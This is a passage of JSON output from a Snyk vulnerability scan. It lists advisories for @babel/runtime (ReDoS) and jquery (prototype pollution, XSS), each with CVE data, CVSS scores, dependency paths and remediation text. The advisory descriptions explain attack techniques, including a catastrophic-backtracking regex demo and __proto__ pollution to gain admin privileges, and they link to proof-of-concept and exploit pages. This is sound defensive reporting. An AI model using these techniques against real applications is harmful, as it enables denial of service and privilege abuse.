        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@mui/private-theming@5.13.1",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@mui/private-theming@5.17.1",
          "@mui/utils@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-JQUERY-174006",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:F",
        "credit": [
          "Semmle Security Research Team"
        ],
        "semver": {
          "vulnerable": [
            "<3.4.0"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "3.4.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.6,
        "functions": [
          {
            "version": [
              ">2.2.4 <=3.3.1"
            ],
            "functionId": {
              "filePath": "dist/core.js",
              "className": null,
              "functionName": "jQuery.extend.jQuery.fn.extend"
            }
          },
          {
            "version": [
              ">1.8.3 <=2.2.4"
            ],
            "functionId": {
              "filePath": "src/core.js",
              "className": null,
              "functionName": "jQuery.extend.jQuery.fn.extend"
            }
          },
          {
            "version": [
              "<=1.8.3"
            ],
            "functionId": {
              "filePath": "test/core.js",
              "className": null,
              "functionName": "module.exports.jQuery.extend(Object, Object)"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jquery",
        "references": [
          {
            "url": "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/jquery/jquery/pull/4333",
            "title": "GitHub PR"
          },
          {
            "url": "https://hackerone.com/reports/454365",
            "title": "Hackerone Report"
          },
          {
            "url": "https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/",
            "title": "Snyk Blog"
          },
          {
            "url": "https://github.com/DanielRuf/snyk-js-jquery-174006",
            "title": "Third-Party Backported Patches Repo"
          },
          {
            "url": "https://www.exploit-db.com/exploits/52141",
            "title": "Exploit DB"
          },
          {
            "url": "https://github.com/chrisneagu/FTC-Skystone-Dark-Angels-Romania-2020",
            "title": "PoC in GitHub"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:47:28.913980Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 5.6,
            "modificationTime": "2024-03-11T09:53:58.699115Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:F",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.1",
            "modificationTime": "2024-11-04T12:15:36.516854Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:47:28.913980Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.6,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:53:58.699115Z"
          }
        ],
        "description": "## Overview\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `extend` function can be tricked into modifying the prototype of `Object` when the attacker controls part of the structure passed to this function. This can let an attacker add or modify an existing property that will then exist on all objects.\r\n\r\n**Note:** CVE-2019-5428 is a duplicate of CVE-2019-11358\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `jquery` to version 3.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)\n- [GitHub PR](https://github.com/jquery/jquery/pull/4333)\n- [Hackerone Report](https://hackerone.com/reports/454365)\n- [Snyk Blog](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)\n- [Third-Party Backported Patches Repo](https://github.com/DanielRuf/snyk-js-jquery-174006)\n- [Exploit DB](https://www.exploit-db.com/exploits/52141)\n- [PoC in GitHub](https://github.com/chrisneagu/FTC-Skystone-Dark-Angels-Romania-2020)\n",
        "epssDetails": {
          "percentile": "0.88714",
          "probability": "0.04527",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2019-11358"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "NSP": [
            "796"
          ],
          "GHSA": [
            "GHSA-wv67-q8rr-grjp"
          ]
        },
        "packageName": "jquery",
        "proprietary": false,
        "creationTime": "2019-03-27T08:43:07.568451Z",
        "functions_new": [
          {
            "version": [
              ">2.2.4 <=3.3.1"
            ],
            "functionId": {
              "filePath": "dist/core.js",
              "functionName": "jQuery.extend.jQuery.fn.extend"
            }
          },
          {
            "version": [
              ">1.8.3 <=2.2.4"
            ],
            "functionId": {
              "filePath": "src/core.js",
              "functionName": "jQuery.extend.jQuery.fn.extend"
            }
          },
          {
            "version": [
              "<=1.8.3"
            ],
            "functionId": {
              "filePath": "test/core.js",
              "functionName": "module.exports.jQuery.extend(Object, Object)"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2019-03-26T08:40:15Z",
        "exploitDetails": {
          "sources": [
            "ExploitDB",
            "PoC in GitHub",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-03-27T08:40:08Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-21T05:20:03.890832Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jquery@3.3.1"
        ],
        "upgradePath": [
          false,
          "jquery@3.5.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jquery",
        "version": "3.3.1"
      },
      {
        "id": "SNYK-JS-JQUERY-565129",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L/E:H/RL:O/RC:C",
        "credit": [
          "Masato Kinugawa"
        ],
        "semver": {
          "vulnerable": [
            ">=1.5.1 <3.5.0"
          ]
        },
        "exploit": "High",
        "fixedIn": [
          "3.5.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": "This vulnerability is only applicable on applications that allow users to write any HTML or dynamically append HTML (even sanitized) with jQuery."
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [
          {
            "version": [
              ">=1.0.3 <3.5.0"
            ],
            "functionId": {
              "filePath": "src/manipulation.js",
              "className": null,
              "functionName": "htmlPrefilter"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jquery",
        "references": [
          {
            "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77",
            "title": "GitHub Commit"
          },
          {
            "url": "https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html",
            "title": "PoC"
          },
          {
            "url": "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/",
            "title": "Release Notes"
          },
          {
            "url": "https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html",
            "title": "Security Blog"
          },
          {
            "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
            "title": "CISA - Known Exploited Vulnerabilities"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:44:28.141025Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.1,
            "modificationTime": "2024-03-11T09:53:58.970683Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L/E:H/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:05:43.345213Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:44:28.141025Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 6.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:58.970683Z"
          }
        ],
        "description": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nPassing HTML containing `<option>` elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\r\n\r\n**NOTE:** This vulnerability was also assigned CVE-2020-23064.\n\n## Details\n\n\n## Remediation\n\nUpgrade `jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Release Notes](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [Security Blog](https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/49767)\n\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",
        "epssDetails": {
          "percentile": "0.95587",
          "probability": "0.21987",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-11023"
          ],
          "CWE": [
            "CWE-79"
          ],
          "GHSA": [
            "GHSA-jpcq-cgw6-v4j6"
          ]
        },
        "packageName": "jquery",
        "proprietary": false,
        "creationTime": "2020-04-13T07:16:49.518552Z",
        "functions_new": [
          {
            "version": [
              ">=1.0.3 <3.5.0"
            ],
            "functionId": {
              "filePath": "src/manipulation.js",
              "functionName": "htmlPrefilter"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2020-04-10T00:00:00Z",
        "exploitDetails": {
          "sources": [
            "CISA",
            "ExploitDB",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "High",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Attacked",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-04-13T15:33:49Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-01-24T04:30:01.522455Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "jquery@3.3.1"
        ],
        "upgradePath": [
          false,
          "jquery@3.5.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jquery",
        "version": "3.3.1"
      },
      {
        "id": "SNYK-JS-JQUERY-567880",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:F/RL:O/RC:R",
        "credit": [
          "Masato Kinugawa"
        ],
        "semver": {
          "vulnerable": [
            ">=1.5.1 <3.5.0"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "3.5.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": "This vulnerability is only applicable on applications that allow users to write any HTML or dynamically append HTML (even sanitized) with jQuery."
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jquery",
        "references": [
          {
            "url": "https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2",
            "title": "GHSA"
          },
          {
            "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77",
            "title": "GitHub Commit"
          },
          {
            "url": "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/",
            "title": "JQuery 3.5.0 Release"
          },
          {
            "url": "https://jquery.com/upgrade-guide/3.5/",
            "title": "JQuery Upgrade Guide"
          },
          {
            "url": "https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html",
            "title": "PoC"
          },
          {
            "url": "https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html",
            "title": "Security Blog"
          },
          {
            "url": "https://github.com/Athlon1600/youtube-downloader/blob/215b2b74f5eea5a1e8c1b9ada28c72ca35e5ab4f/public/index.html%23L6",
